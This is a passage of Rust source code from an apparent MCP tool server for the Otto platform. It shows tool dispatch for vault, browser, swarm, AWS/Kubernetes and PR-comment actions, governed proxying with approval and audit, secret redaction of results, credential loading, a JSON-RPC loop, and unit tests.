                    "no workspace context (OTTO_WORKSPACE_ID unset); cannot create a scene".into(),
                );
            };
            let title = arg_str(args, "title")?;
            let format = args
                .get("format")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
                .unwrap_or("mermaid");
            if !matches!(format, "mermaid" | "d2" | "excalidraw") {
                return Err(format!(
                    "invalid format `{format}` — must be one of: mermaid | d2 | excalidraw"
                ));
            }
            let source = match args
                .get("source")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
            {
                Some(s) => s.to_string(),
                None if format == "excalidraw" => {
                    json!({ "type": "excalidraw", "version": 2, "source": "otto", "elements": [] })
                        .to_string()
                }
                None => String::new(),
            };
            let mut body = json!({
                "title": title,
                "doc": { "type": "otto-canvas", "version": 1, "format": format, "source": source },
            });
            if let Some(section) = args
                .get("section")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
            {
                body["section"] = json!(section);
            }
            let created = ctx
                .post_json(&format!("/workspaces/{}/canvas/scenes", seg(&ws)), &body)
                .await?;
            let scene_id = created
                .get("id")
                .and_then(Value::as_str)
                .ok_or_else(|| "daemon did not return a scene id".to_string())?
                .to_string();

            // Reference the new scene to this session — best-effort: a session-less
            // caller (e.g. `canvas/assist/preview`-style testing) still gets the
            // created scene back even if the ref-attach can't run.
            if let Some(sid) = ctx.session_id.clone() {
                let _ = ctx
                    .post_json(
                        &format!("/sessions/{}/canvas-refs", seg(&sid)),
                        &json!({ "scene_id": scene_id }),
                    )
                    .await;
            }

            Ok(finalize(
                json!({ "scene_id": scene_id, "workspace_id": ws }),
            ))
        }
        "canvas_update_scene" => {
            let scene_id = arg_str(args, "scene_id")?;
            let source = arg_str(args, "source")?;

            let existing = ctx
                .get_json(&format!("/canvas/scenes/{}", seg(&scene_id)))
                .await?;
            let existing_doc: Value = existing
                .get("doc_json")
                .and_then(Value::as_str)
                .and_then(|s| serde_json::from_str(s).ok())
                .unwrap_or(json!({}));
            let format = existing_doc
                .get("format")
                .and_then(Value::as_str)
                .unwrap_or("mermaid")
                .to_string();

            let mut new_doc = json!({
                "type": "otto-canvas",
                "version": 1,
                "format": format,
                "source": source,
            });
            if let Some(sketch) = existing_doc.get("sketch") {
                new_doc["sketch"] = sketch.clone();
            }

            ctx.put_json(
                &format!("/canvas/scenes/{}", seg(&scene_id)),
                &json!({ "doc": new_doc }),
            )
            .await?;

            Ok(finalize(json!({ "ok": true, "format": format })))
        }
        // Vault v3 doc writers — Editor-gated by the daemon route; the delete is
        // a soft move into `.trash/`.
        "swarm_create_task" => {
            let pid = arg_str(args, "project_id")?;
            let mut body = json!({ "title": arg_str(args, "title")? });
            for k in ["description", "assignee_agent_id", "priority"] {
                if let Some(v) = args
                    .get(k)
                    .and_then(Value::as_str)
                    .filter(|s| !s.is_empty())
                {
                    body[k] = json!(v);
                }
            }
            let task = ctx
                .post_json(&format!("/swarm/projects/{}/tasks", seg(&pid)), &body)
                .await?;
            Ok(finalize(json!({ "ok": true, "task": task })))
        }
        "swarm_update_task" => {
            let tid = arg_str(args, "task_id")?;
            let mut body = json!({});
            for k in [
                "status",
                "assignee_agent_id",
                "priority",
                "title",
                "description",
            ] {
                if let Some(v) = args
                    .get(k)
                    .and_then(Value::as_str)
                    .filter(|s| !s.is_empty())
                {
                    body[k] = json!(v);
                }
            }
            if body.as_object().is_some_and(|o| o.is_empty()) {
                return Err("nothing to update — pass at least one of status/assignee_agent_id/priority/title/description".into());
            }
            let task = ctx
                .patch_json(&format!("/swarm/tasks/{}", seg(&tid)), &body)
                .await?;
            Ok(finalize(json!({ "ok": true, "task": task })))
        }
        "swarm_run_task" => {
            let tid = arg_str(args, "task_id")?;
            let run = ctx
                .post_json(&format!("/swarm/tasks/{}/run", seg(&tid)), &json!({}))
                .await?;
            Ok(finalize(json!({ "ok": true, "run": run })))
        }
        "swarm_stop_run" => {
            let rid = arg_str(args, "run_id")?;
            let run = ctx
                .post_json(&format!("/swarm/runs/{}/stop", seg(&rid)), &json!({}))
                .await?;
            Ok(finalize(json!({ "ok": true, "run": run })))
        }
        "otto_vault_write" => {
            let ws = ctx
                .workspace_id
                .clone()
                .ok_or("no workspace context (OTTO_WORKSPACE_ID unset)")?;
            let v = arg_i64(args, "vault_id")?;
            let mut body = json!({
                "path": arg_str(args, "path")?,
                "content": arg_string_allow_empty(args, "content")?,
            });
            if let Some(h) = arg_optional_string(args, "if_hash")? {
                body["if_hash"] = json!(h);
            }
            let meta = ctx
                .put_json(
                    &format!("/workspaces/{}/vault/vaults/{v}/note", seg(&ws)),
                    &body,
                )
                .await?;
            Ok(finalize(json!({ "ok": true, "meta": meta })))
        }
        "otto_vault_write_file" => {
            let ws = ctx
                .workspace_id
                .clone()
                .ok_or("no workspace context (OTTO_WORKSPACE_ID unset)")?;
            let v = arg_i64(args, "vault_id")?;
            let mut body = json!({
                "path": arg_str(args, "path")?,
                "content": arg_string_allow_empty(args, "content")?,
            });
            if let Some(h) = arg_optional_string(args, "if_hash")? {
                body["if_hash"] = json!(h);
            }
            let file = ctx
                .put_json(
                    &format!("/workspaces/{}/vault/vaults/{v}/file", seg(&ws)),
                    &body,
                )
                .await?;
            Ok(finalize(json!({ "ok": true, "file": file })))
        }
        "otto_vault_rename" => {
            let ws = ctx
                .workspace_id
                .clone()
                .ok_or("no workspace context (OTTO_WORKSPACE_ID unset)")?;
            let v = arg_i64(args, "vault_id")?;
            let body = json!({ "from": arg_str(args, "from")?, "to": arg_str(args, "to")? });
            let res = ctx
                .post_json(
                    &format!("/workspaces/{}/vault/vaults/{v}/rename", seg(&ws)),
                    &body,
                )
                .await?;
            Ok(finalize(res))
        }
        "otto_vault_delete" => {
            let ws = ctx
                .workspace_id
                .clone()
                .ok_or("no workspace context (OTTO_WORKSPACE_ID unset)")?;
            let v = arg_i64(args, "vault_id")?;
            ctx.delete_ok(&format!(
                "/workspaces/{}/vault/vaults/{v}/note?path={}",
                seg(&ws),
                seg(&arg_str(args, "path")?)
            ))
            .await?;
            Ok(finalize(json!({ "ok": true, "trashed": args.get("path") })))
        }
        // Browser tools — all call the governed browser routes with the
        // session's own token (netguard + RBAC enforced there, same as the
        // Browser module UI). `browser_navigate` is the only write: it opens
        // a reader-mode tab (a genuine new `browser_tabs` row), so it's an
        // explicit arm rather than a `FEATURE_READ_TOOLS` GET/POST mapping.
        "browser_navigate" => {
            let ws = ctx
                .workspace_id
                .clone()
                .ok_or("no workspace context (OTTO_WORKSPACE_ID unset)")?;
            let url = arg_str(args, "url")?;
            let tab = ctx
                .post_json(
                    &format!("/workspaces/{}/browser/tabs", seg(&ws)),
                    &json!({ "url": url }),
                )
                .await?;
            let tab_id = tab
                .get("id")
                .and_then(Value::as_str)
                .ok_or_else(|| "daemon did not return a tab id".to_string())?
                .to_string();
            // The tab is created in mode:"reader" by construction (see
            // `otto_state::browser::BrowserTabsRepo::create`), so this PATCH
            // runs the fetch pipeline and adopts the fetched page's title.
            let updated = ctx
                .patch_json(
                    &format!("/browser/tabs/{}", seg(&tab_id)),
                    &json!({ "url": url }),
                )
                .await?;
            let title = updated
                .get("title")
                .cloned()
                .unwrap_or(Value::String(String::new()));
            Ok(finalize(json!({ "ok": true, "title": title })))
        }
        "browser_page" => {
            let Some(ws) = ctx.workspace_id.as_deref() else {
                return Err(
                    "no workspace context (OTTO_WORKSPACE_ID unset); cannot fetch a page".into(),
                );
            };
            let url = arg_str(args, "url")?;
            let raw = ctx
                .get_json(&format!(
                    "/workspaces/{}/browser/page?url={}",
                    seg(ws),
                    seg(&url)
                ))
                .await?;
            // Drop `url` (the caller already has it) and `html` (raw markup —
            // large, and `markdown` is the extracted content agents want) so
            // the result stays small; keep the rest verbatim.
            Ok(finalize(json!({
                "markdown": raw.get("markdown").cloned().unwrap_or(Value::Null),
                "title": raw.get("title").cloned().unwrap_or(Value::Null),
                "engine": raw.get("engine").cloned().unwrap_or(Value::Null),
                "degraded": raw.get("degraded").cloned().unwrap_or(Value::Null),
            })))
        }
        "browser_query" => {
            let Some(ws) = ctx.workspace_id.as_deref() else {
                return Err(
                    "no workspace context (OTTO_WORKSPACE_ID unset); cannot query a page".into(),
                );
            };
            let url = arg_str(args, "url")?;
            let selector = arg_str(args, "selector")?;
            let raw = ctx
                .get_json(&format!(
                    "/workspaces/{}/browser/query?url={}&selector={}",
                    seg(ws),
                    seg(&url),
                    seg(&selector)
                ))
                .await?;
            Ok(finalize(raw))
        }
        "browser_summarize" => {
            let Some(ws) = ctx.workspace_id.as_deref() else {
                return Err(
                    "no workspace context (OTTO_WORKSPACE_ID unset); cannot summarize a page"
                        .into(),
                );
            };
            let url = arg_str(args, "url")?;
            let raw = ctx
                .post_json(
                    &format!("/workspaces/{}/browser/summarize", seg(ws)),
                    &json!({ "url": url }),
                )
                .await?;
            Ok(finalize(raw))
        }
        // Read-only list of the user's marks — the Browser page's ask bar
        // also inlines the current page's marks into the turn it submits,
        // so this is the agent's own way to look them up later (a follow-up
        // question, or a mark made after the ask).
        "browser_marks" => {
            let Some(ws) = ctx.workspace_id.as_deref() else {
                return Err(
                    "no workspace context (OTTO_WORKSPACE_ID unset); cannot list marks".into(),
                );
            };
            let url = args
                .get("url")
                .and_then(Value::as_str)
                .map(str::trim)
                .filter(|u| !u.is_empty());
            let path = match url {
                Some(u) => format!("/workspaces/{}/browser/annotations?url={}", seg(ws), seg(u)),
                None => format!("/workspaces/{}/browser/annotations", seg(ws)),
            };
            let raw = ctx.get_json(&path).await?;
            // Trim each row to what an agent acts on; the excerpt is raw page
            // HTML and can be large, so cap it per mark.
            let marks: Vec<Value> = raw
                .as_array()
                .map(|rows| {
                    rows.iter()
                        .map(|a| {
                            let excerpt: String = a
                                .get("excerpt")
                                .and_then(Value::as_str)
                                .unwrap_or("")
                                .chars()
                                .take(1_000)
                                .collect();
                            json!({
                                "id": a.get("id").cloned().unwrap_or(Value::Null),
                                "url": a.get("url").cloned().unwrap_or(Value::Null),
                                "selector": a.get("selector").cloned().unwrap_or(Value::Null),
                                "text": a.get("text").cloned().unwrap_or(Value::Null),
                                "excerpt": excerpt,
                                "comment": a.get("comment").cloned().unwrap_or(Value::Null),
                                "created_at": a.get("created_at").cloned().unwrap_or(Value::Null),
                            })
                        })
                        .collect()
                })
                .unwrap_or_default();
            Ok(finalize(json!({ "marks": marks })))
        }
        // The daemon resolves the credential (`allow_agent_use` required,
        // else a typed 403) and drives the fill+submit itself — this arm only
        // ever sends/receives `domain`/`logged_in`/`engine`; the password
        // never reaches this process at all. `finalize`'s `redact_json` pass
        // is defense-in-depth on top of that, not the only guard.
        "browser_login" => {
            let Some(ws) = ctx.workspace_id.as_deref() else {
                return Err(
                    "no workspace context (OTTO_WORKSPACE_ID unset); cannot sign in".into(),
                );
            };
            let domain = arg_str(args, "domain")?;
            let raw = ctx
                .post_json(
                    &format!("/workspaces/{}/browser/login", seg(ws)),
                    &json!({ "domain": domain }),
                )
                .await?;
            Ok(finalize(raw))
        }
        // First-party feature reads (workflows / brokers / issues / swarm / vault /
        // repos / sessions / product / findings / usage / self-improvement). All
        // route through the pure `read_route` and post-process identically: the raw
        // upstream value is capped + redacted by `finalize`.
        // PR comment — the one WRITE on this surface. It lives here rather than
        // behind the gateway because the review workflow's whole product is
        // comments on a PR, and routing it through a gateway that silently
        // returns an empty tool list on any error left agents reporting
        // "comment_pr does not exist" and the PR at zero comments. Same daemon
        // route the Otto UI uses; the caller's own session token authorizes it,
        // and the call is audited like every other.
        "otto_comment_pr" => {
            let repo_id = arg_str(args, "repo_id")?;
            let number = arg_u64(args, "pr_number")?;
            let body = arg_str(args, "body")?;
            let mut payload = json!({ "body": body });
            // path/line anchor the comment inline; in_reply_to threads it. All
            // optional — omitting them posts a PR-level comment.
            if let Some(path) = arg_optional_string(args, "path")? {
                payload["path"] = json!(path);
            }
            if let Some(line) = args.get("line").and_then(u64_lenient) {
                payload["line"] = json!(line);
            }
            if let Some(reply) = arg_optional_string(args, "in_reply_to")? {
                payload["in_reply_to"] = json!(reply);
            }
            let raw = ctx
                .post_json(
                    &format!("/repos/{}/prs/{number}/comments", seg(&repo_id)),
                    &payload,
                )
                .await?;
            Ok(finalize(raw))
        }
        // ---- AWS / Kubernetes console (docs/design/aws-k8s-consoles.md §6).
        // `k8s_logs` is the one text/plain read; the three writers below hit the
        // per-feature Edit-gated console routes as the session owner.
        "k8s_logs" => {
            let (text, truncated) = ctx.get_text(&k8s_logs_path(args)?).await?;
            let lines = text.lines().count() as i64;
            let (v, _) = finalize(json!({ "text": text, "truncated": truncated }));
            Ok((v, Some(lines)))
        }
        "aws_athena_query" => {
            let acc = arg_str(args, "account_id")?;
            let mut body = json!({ "sql": arg_str(args, "sql")? });
            for k in ["database", "workgroup", "output_location"] {
                if let Some(v) = arg_optional_string(args, k)?.filter(|s| !s.is_empty()) {
                    body[k] = json!(v);
                }
            }
            let raw = ctx
                .post_json(
                    &format!(
                        "/aws/accounts/{}/athena/query?{}",
                        seg(&acc),
                        opt_query(args, &[("region", "region")]).trim_start_matches('&')
                    ),
                    &body,
                )
                .await?;
            Ok(finalize(raw))
        }
        "aws_sqs_send" => {
            let acc = arg_str(args, "account_id")?;
            let mut body = json!({ "url": arg_str(args, "url")?, "body": arg_str(args, "body")? });
            if let Some(d) = args.get("delay_seconds").and_then(u64_lenient) {
                body["delay_seconds"] = json!(d);
            }
            for k in ["group_id", "dedup_id"] {
                if let Some(v) = arg_optional_string(args, k)?.filter(|s| !s.is_empty()) {
                    body[k] = json!(v);
                }
            }
            if let Some(attrs) = args.get("message_attributes").filter(|v| v.is_object()) {
                body["message_attributes"] = attrs.clone();
            }
            let raw = ctx
                .post_json(
                    &format!(
                        "/aws/accounts/{}/sqs/queues/send?{}",
                        seg(&acc),
                        opt_query(args, &[("region", "region")]).trim_start_matches('&')
                    ),
                    &body,
                )
                .await?;
            Ok(finalize(raw))
        }
        "k8s_action" => {
            let cluster = arg_str(args, "cluster_id")?;
            let body = json!({
                "action": arg_str(args, "action")?,
                "kind": arg_str(args, "kind")?,
                "ns": arg_str(args, "namespace")?,
                "name": arg_str(args, "name")?,
                // Forwarded verbatim: the route owns the confirm_name / replicas /
                // prune / revision semantics (§3.3, §4.6).
                "params": args.get("params").cloned().unwrap_or(json!({})),
            });
            let raw = ctx
                .post_json(&format!("/k8s/clusters/{}/actions", seg(&cluster)), &body)
                .await?;
            Ok(finalize(raw))
        }
        "otto_open_session" => {
            let ws = ctx
                .workspace_id
                .as_deref()
                .ok_or("no workspace context (OTTO_WORKSPACE_ID unset)")?;
            let mut body = json!({ "provider": arg_str(args, "provider")? });
            for k in ["title", "cwd", "model", "prompt"] {
                if let Some(v) = arg_optional_string(args, k)?.filter(|s| !s.is_empty()) {
                    body[k] = json!(v);
                }
            }
            let raw = ctx
                .post_json(&format!("/workspaces/{}/sessions/open", seg(ws)), &body)
                .await?;
            Ok(finalize(raw))
        }
        "otto_send_message" => {
            let id = arg_str(args, "session_id")?;
            let body = json!({ "text": arg_str(args, "text")? });
            let raw = ctx
                .post_json(&format!("/sessions/{}/message", seg(&id)), &body)
                .await?;
            Ok(finalize(raw))
        }
        name if NATIVE_DIRECTORY_TOOLS.iter().any(|(t, _)| *t == name) => {
            let kind = NATIVE_DIRECTORY_TOOLS
                .iter()
                .find(|(t, _)| *t == name)
                .map(|(_, k)| *k)
                .unwrap_or_default();
            let raw = ctx
                .get_json(&directory_path(kind, args, ctx.workspace_id.as_deref()))
                .await?;
            Ok(finalize(raw))
        }
        name if FEATURE_READ_TOOLS.contains(&name) => {
            // An explicit (already resolved) `workspace_id` picks another
            // workspace for the workspace-scoped reads; default: this session's.
            let ws = args
                .get("workspace_id")
                .and_then(Value::as_str)
                .filter(|s| !s.is_empty())
                .or(ctx.workspace_id.as_deref());
            let call = read_route(name, args, ws)?;
            let raw = if call.post {
                ctx.post_json(&call.path, call.body.as_ref().unwrap_or(&json!({})))
                    .await?
            } else {
                ctx.get_json(&call.path).await?
            };
            Ok(finalize(raw))
        }
        other => Err(format!("unknown tool `{other}`")),
    }
}

/// Proxy a namespaced gateway tool (`mcp__<server>__<tool>`) through the control
/// plane's governed `/mcp/gateway/invoke`. The pipeline there does allowlist /
/// policy / approval / dry-run / execute / **audit**, so this path does NOT write
/// the first-party `mcp_tool_calls` row (the call is already on `mcp_call_log`).
/// Returns the governed envelope and whether it was an error/denial.
async fn gateway_call(ctx: &Ctx, namespaced: &str, args: &Value) -> Result<(Value, bool), String> {
    let Some(ws) = &ctx.workspace_id else {
        return Err("gateway: no workspace context".into());
    };
    let tools = ctx.gateway_tools().await;
    let entry = tools
        .iter()
        .find(|t| t.get("name").and_then(Value::as_str) == Some(namespaced))
        .ok_or_else(|| format!("unknown gateway tool `{namespaced}`"))?;
    let server_id = entry.get("server_id").and_then(Value::as_str).unwrap_or("");
    let tool = entry.get("tool").and_then(Value::as_str).unwrap_or("");
    let body = json!({
        "server_id": server_id,
        "tool": tool,
        "arguments": args,
        "workspace_id": ws,
        "session_id": ctx.session_id,
    });
    let v = ctx.post_json("/mcp/gateway/invoke", &body).await?;
    let is_error = matches!(
        v.get("decision").and_then(Value::as_str),
        Some("denied") | Some("error")
    ) || v.get("is_error").and_then(Value::as_bool).unwrap_or(false);
    Ok((v, is_error))
}

/// Proxy a control-plane (`otto.*`) tool call through the governed choke point
/// `POST /mcp/otto-tools/invoke`. `name` is the stdio name (`otto_create_pr`),
/// already known to map to a governed spec. The tool must be ENABLED in the
/// control plane right now — the invoke route itself exempts internal session
/// tokens from the enabled list, but this surface promises to mirror the
/// operator's checklist, so a disabled tool is refused here with a pointer to
/// where to enable it. The governed envelope (`decision`, `content`,
/// `approval_id`…) is returned whole so the agent can see a denial reason or a
/// pending approval; the route audits the call itself.
async fn governed_call(ctx: &Ctx, name: &str, args: &Value) -> Result<(Value, bool), String> {
    let spec = governed_spec_for_stdio_name(name)
        .ok_or_else(|| format!("`{name}` is not a governed Otto tool"))?;
    let full = spec["name"].as_str().unwrap_or_default().to_string();
    let enabled = ctx.governed_enabled().await.ok_or_else(|| {
        format!("`{name}` is unavailable: the Otto MCP server tool list could not be read from the daemon")
    })?;
    if !enabled.contains(&full) {
        return Err(format!(
            "`{name}` ({full}) is not enabled on the Otto MCP server — enable it under \
             MCP → Otto server in Otto, then call it again"
        ));
    }
    let body = json!({
        "tool": full,
        "arguments": governed_invoke_args(ctx, &spec, args),
        "wait_seconds": GOVERNED_WAIT_SECS,
    });
    // The daemon first waits up to GOVERNED_WAIT_SECS on a human decision,
    // then runs the tool with its own per-tool self-call budget (≤ 180 s).
    let v = ctx
        .post_json_within(
            "/mcp/otto-tools/invoke",
            &body,
            Duration::from_secs(GOVERNED_WAIT_SECS + 190),
        )
        .await?;
    let is_error = matches!(
        v.get("decision").and_then(Value::as_str),
        Some("denied") | Some("error")
    ) || v.get("is_error").and_then(Value::as_bool).unwrap_or(false);
    Ok((v, is_error))
}

/// Apply the row cap then redaction to a tool result, returning the cleaned
/// value and the audited row count (largest array length seen pre-cap).
fn finalize(v: Value) -> (Value, Option<i64>) {
    let mut max_seen = 0usize;
    let capped = cap_rows(v, &mut max_seen);
    let redacted = redact_json(&capped).value;
    (redacted, Some(max_seen as i64))
}

/// Build a JSON-RPC success result envelope.
fn rpc_ok(id: Value, result: Value) -> Value {
    json!({ "jsonrpc": "2.0", "id": id, "result": result })
}

/// Build a JSON-RPC error envelope.
fn rpc_err(id: Value, code: i64, message: impl Into<String>) -> Value {
    json!({ "jsonrpc": "2.0", "id": id, "error": { "code": code, "message": message.into() } })
}

/// Wrap a tool result `Value` as MCP `tools/call` content (a single JSON text
/// block, pretty-printed). `is_error` flags a tool-level failure to the client.
fn tool_result(value: &Value, is_error: bool) -> Value {
    let text = serde_json::to_string_pretty(value).unwrap_or_else(|_| value.to_string());
    json!({
        "content": [ { "type": "text", "text": text } ],
        "isError": is_error
    })
}

/// Handle a single decoded JSON-RPC request, returning the response to write
/// (or `None` for a notification, which gets no reply).
async fn handle(ctx: &Ctx, msg: Value) -> Option<Value> {
    let method = msg.get("method").and_then(|v| v.as_str()).unwrap_or("");
    let id = msg.get("id").cloned();
    // Notifications carry no `id` and MUST NOT be answered.
    let is_notification = id.is_none();

    match method {
        "initialize" => {
            let result = json!({
                "protocolVersion": PROTOCOL_VERSION,
                "capabilities": { "tools": {} },
                "serverInfo": { "name": "otto", "version": env!("CARGO_PKG_VERSION") }
            });
            Some(rpc_ok(id.unwrap_or(Value::Null), result))
        }
        // Client tells us it's ready; no response.
        "notifications/initialized" | "initialized" => None,
        "ping" => Some(rpc_ok(id.unwrap_or(Value::Null), json!({}))),
        "tools/list" => {
            // The static first-party read-only catalog, plus — when the live-agent
            // gateway is enabled for this workspace — the governed downstream tools.
            let mut cat = tool_catalog_for_source(ctx.source.as_deref());
            let reviewer = is_vault_docs_reviewer(ctx.source.as_deref());
            let gw = if reviewer {
                Vec::new()
            } else {
                ctx.gateway_tools().await
            };
            // …plus the control-plane-enabled otto.* tools this surface doesn't
            // serve natively (what the operator ticked under MCP → Otto server).
            let governed = if reviewer {
                Vec::new()
            } else {
                match ctx.governed_enabled().await {
                    Some(enabled) => governed_tools_for(&enabled),
                    None => Vec::new(),
                }
            };
            if let Some(arr) = cat["tools"].as_array_mut() {
                arr.extend(governed);
                for t in gw {
                    arr.push(json!({
                        "name": t["name"],
                        "description": t["description"],
                        "inputSchema": t["inputSchema"],
                    }));
                }
            }
            Some(rpc_ok(id.unwrap_or(Value::Null), cat))
        }
        "tools/call" => {
            let id = id.unwrap_or(Value::Null);
            let params = msg.get("params").cloned().unwrap_or(Value::Null);
            let name = params
                .get("name")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let args = params.get("arguments").cloned().unwrap_or(json!({}));
            if is_vault_docs_reviewer(ctx.source.as_deref())
                && (VAULT_MUTATION_TOOLS.contains(&name.as_str())
                    || API_MUTATION_TOOLS.contains(&name.as_str()))
            {
                let family = if API_MUTATION_TOOLS.contains(&name.as_str()) {
                    "API mutation"
                } else {
                    "vault mutation"
                };
                return Some(rpc_ok(
                    id,
                    tool_result(
                        &json!({ "error": format!("{family} tools are disabled for documentation review sessions") }),
                        true,
                    ),
                ));
            }
            if is_vault_docs_reviewer(ctx.source.as_deref()) {
                return Some(match run_reviewer_read(ctx, &name, &args).await {
                    Ok(value) => {
                        ctx.audit(&name, &args, true, None).await;
                        rpc_ok(id, tool_result(&value, false))
                    }
                    Err(error) => {
                        ctx.audit(&name, &args, false, None).await;
                        rpc_ok(id, tool_result(&json!({"error": error}), true))
                    }
                });
            }
            // A namespaced `mcp__server__tool` is a governed downstream call —
            // route it through the control-plane gateway (which audits it itself).
            if name.starts_with("mcp__") {
                return Some(match gateway_call(ctx, &name, &args).await {
                    Ok((v, is_error)) => rpc_ok(id, tool_result(&v, is_error)),
                    Err(e) => rpc_ok(id, tool_result(&json!({ "error": e }), true)),
                });
            }
            // A control-plane otto.* tool with no native twin — governed proxy
            // (enabled-check, approval, audit all happen daemon-side).
            if governed_tool_for_stdio_name(&name).is_some() {
                return Some(match governed_call(ctx, &name, &args).await {
                    Ok((v, is_error)) => rpc_ok(id, tool_result(&v, is_error)),
                    Err(e) => rpc_ok(id, tool_result(&json!({ "error": e }), true)),
                });
            }
            match run_tool(ctx, &name, &args).await {
                Ok((value, rows)) => {
                    ctx.audit(&name, &args, true, rows).await;
                    Some(rpc_ok(id, tool_result(&value, false)))
                }
                Err(e) => {
                    ctx.audit(&name, &args, false, None).await;
                    // Tool-level errors are returned as a successful RPC with an
                    // error content block (per MCP), so the agent sees the reason
                    // rather than a transport failure.
                    Some(rpc_ok(id, tool_result(&json!({ "error": e }), true)))
                }
            }
        }
        _ if is_notification => None,
        _ => Some(rpc_err(
            id.unwrap_or(Value::Null),
            -32601,
            format!("method not found: {method}"),
        )),
    }
}

/// Resolved credentials + routing for the tools — from env (the Claude path) or a
/// per-session creds file (the Codex path).
struct Creds {
    token: String,
    base: Option<String>,
    session_id: Option<String>,
    workspace_id: Option<String>,
    source: Option<String>,
}

/// Find the creds-file path: `--config <path>` / `--config=<path>` in `args`, else
/// the `OTTO_MCP_CONFIG` env. Pure over `args` for testability.
fn config_path_in(args: &[String]) -> Option<String> {
    let mut it = args.iter();
    while let Some(a) = it.next() {
        if a == "--config" {
            return it.next().cloned();
        }
        if let Some(p) = a.strip_prefix("--config=") {
            return Some(p.to_string());
        }
    }
    std::env::var("OTTO_MCP_CONFIG")
        .ok()
        .filter(|s| !s.is_empty())
}

/// Parse a per-session creds JSON document (`{token, base?, session_id?,
/// workspace_id?}`). Pure for testability; errors if the `token` is missing.
fn parse_creds(body: &str) -> Result<Creds, String> {
    let v: Value = serde_json::from_str(body).map_err(|e| format!("parse creds: {e}"))?;
    let token = v
        .get("token")
        .and_then(Value::as_str)
        .unwrap_or("")
        .to_string();
    if token.is_empty() {
        return Err("creds file has no `token`".into());
    }
    let s = |k: &str| {
        v.get(k)
            .and_then(Value::as_str)
            .filter(|s| !s.is_empty())
            .map(str::to_string)
    };
    Ok(Creds {
        token,
        base: s("base"),
        session_id: s("session_id"),
        workspace_id: s("workspace_id"),
        source: s("source"),
    })
}

/// Resolve credentials: env first (Claude — `OTTO_MCP_TOKEN` & friends), then a
/// per-session creds file (Codex — `--config <path>` / `OTTO_MCP_CONFIG`).
fn load_creds(args: &[String]) -> Result<Creds, String> {
    if let Ok(token) = std::env::var("OTTO_MCP_TOKEN") {
        if !token.is_empty() {
            let s = |k: &str| std::env::var(k).ok().filter(|v| !v.trim().is_empty());
            return Ok(Creds {
                token,
                base: s("OTTO_MCP_BASE"),
                session_id: s("OTTO_SESSION_ID"),
                workspace_id: s("OTTO_WORKSPACE_ID"),
                source: s("OTTO_SESSION_SOURCE"),
            });
        }
    }
    let path = config_path_in(args).ok_or_else(|| {
        "no OTTO_MCP_TOKEN and no --config/OTTO_MCP_CONFIG creds file (the first-party \
         tools require a per-session token)"
            .to_string()
    })?;
    let body = std::fs::read_to_string(&path).map_err(|e| format!("read creds {path}: {e}"))?;
    parse_creds(&body)
}

/// Entry point for `ottod mcp-tools`. Reads JSON-RPC lines on stdin, writes
/// responses on stdout, until EOF.
pub async fn run() -> Result<(), String> {
    // Credentials + routing come from the env the session manager injected (the
    // Claude path: `OTTO_MCP_TOKEN`/`OTTO_MCP_BASE`/`OTTO_SESSION_ID`/
    // `OTTO_WORKSPACE_ID`), OR — when the token env is absent (the Codex path,
    // which can't carry per-session env through `-c` cleanly) — from a per-session
    // creds file named by `--config <path>` / `OTTO_MCP_CONFIG`.
    let args: Vec<String> = std::env::args().collect();
    let creds = load_creds(&args)?;
    let token = creds.token;
    let base = creds.base.unwrap_or_else(|| {
        let cfg = Config::load();
        format!("http://127.0.0.1:{}", cfg.port)
    });
    let session_id = creds.session_id;
    let workspace_id = creds.workspace_id;
    let source = creds.source;

    // Open the same SQLite DB the daemon uses, for the audit ledger. Best-effort:
    // if it can't be opened the tools still run, audit just degrades to stderr.
    let audit = match otto_state::open(&Config::load().db_path()).await {
        Ok(pool) => Some(McpAuditRepo::new(pool)),
        Err(e) => {
            eprintln!("ottod mcp-tools: audit DB unavailable ({e}); audit disabled");
            None
        }
    };

    let http = reqwest::Client::builder()
        .timeout(CALL_TIMEOUT)
        .build()
        .map_err(|e| format!("build http client: {e}"))?;

    let ctx = Ctx {
        http,
        base,
        token,
        session_id,
        workspace_id,
        source,
        audit,
    };

    let stdin = tokio::io::stdin();
    let mut reader = BufReader::new(stdin);
    let mut stdout = tokio::io::stdout();
    let mut line = String::new();

    loop {
        line.clear();
        let n = reader
            .read_line(&mut line)
            .await
            .map_err(|e| format!("read stdin: {e}"))?;
        if n == 0 {
            break; // EOF: the client closed the pipe.
        }
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let msg: Value = match serde_json::from_str(trimmed) {
            Ok(v) => v,
            Err(e) => {
                // Malformed line: emit a parse-error response with null id.
                let resp = rpc_err(Value::Null, -32700, format!("parse error: {e}"));
                write_line(&mut stdout, &resp).await?;
                continue;
            }
        };
        if let Some(resp) = handle(&ctx, msg).await {
            write_line(&mut stdout, &resp).await?;
        }
    }
    Ok(())
}

/// Serialize one JSON-RPC message and write it as a single newline-terminated
/// line, flushing so the client sees it immediately.
async fn write_line(stdout: &mut tokio::io::Stdout, value: &Value) -> Result<(), String> {
    let mut buf = serde_json::to_vec(value).map_err(|e| format!("encode response: {e}"))?;
    buf.push(b'\n');
    stdout
        .write_all(&buf)
        .await
        .map_err(|e| format!("write stdout: {e}"))?;
    stdout
        .flush()
        .await
        .map_err(|e| format!("flush stdout: {e}"))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cap_rows_truncates_and_marks() {
        let big: Vec<Value> = (0..(MAX_ROWS + 50)).map(|i| json!(i)).collect();
        let mut max = 0;
        let out = cap_rows(json!({ "items": big }), &mut max);
        let arr = out["items"].as_array().unwrap();
        // MAX_ROWS kept + 1 truncation marker.
        assert_eq!(arr.len(), MAX_ROWS + 1);
        assert_eq!(max, MAX_ROWS + 50);
        assert!(arr.last().unwrap().as_str().unwrap().contains("truncated"));
    }

    #[test]
    fn cap_rows_passes_small_arrays() {
        let mut max = 0;
        let out = cap_rows(json!({ "a": [1, 2, 3] }), &mut max);
        assert_eq!(out["a"].as_array().unwrap().len(), 3);
        assert_eq!(max, 3);
    }

    #[test]
    fn finalize_redacts_secrets_in_result() {
        // A value carrying a sensitive key must come back redacted.
        let (v, _rows) =
            finalize(json!({ "rows": [ { "password": "hunter2", "name": "alice" } ] }));
        assert_eq!(v["rows"][0]["password"], json!("[redacted]"));
        assert_eq!(v["rows"][0]["name"], json!("alice"));
    }

    #[test]
